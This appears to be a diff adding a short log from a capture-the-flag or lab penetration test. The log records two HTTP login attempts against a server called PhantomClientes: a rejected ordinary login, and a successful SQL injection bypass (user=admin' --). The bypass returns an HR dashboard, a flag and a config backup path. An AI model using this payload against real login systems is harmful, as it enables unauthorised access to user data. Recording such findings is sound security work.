@@ -1,0 +1,18 @@
+﻿=== Intento normal: user=test, pass=test ===
+HTTP/1.0 401 Unauthorized
+Server: PhantomClientes/2.0 
+Date: Sat, 07 Nov 2026 14:53:47 GMT
+Content-Type: text/plain
+
+Credenciales invalidas
+
+=== H-02 SQLi bypass: user=admin' --, pass=x ===
+HTTP/1.0 200 OK
+Server: PhantomClientes/2.0 
+Date: Sat, 07 Nov 2026 14:53:47 GMT
+Content-Type: text/plain
+
+Bienvenido admin. Dashboard RRHH.
+FLAG{final_sqli_foothold}
+Backup de config disponible en: /backup/rrhh.conf
+
